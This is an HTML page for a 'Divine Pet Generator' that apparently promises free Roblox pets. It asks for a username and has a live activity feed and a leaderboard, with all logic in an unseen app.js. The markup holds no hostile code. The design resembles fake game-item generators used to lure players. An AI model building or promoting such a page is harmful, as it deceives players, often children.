<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Pet Generator</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>🐾 Divine Pet Generator</h1>

    <!-- Username Input -->
    <div class="generator-box">
      <input type="text" id="username" placeholder="Enter Roblox Username">
      <button id="checkBtn">Start</button>
      <div id="profile"></div>
      <div id="result"></div>
      <div id="serverButton"></div>
    </div>

    <!-- Live Activity -->
    <h2>🎉 Live Activity</h2>
    <div id="activityFeed" class="activity-feed"></div>

    <!-- Leaderboard -->
    <h2>🏆 Leaderboard</h2>
    <div id="leaderboard" class="leaderboard"></div>
  </div>

  <script src="app.js"></script>
</body>
</html>
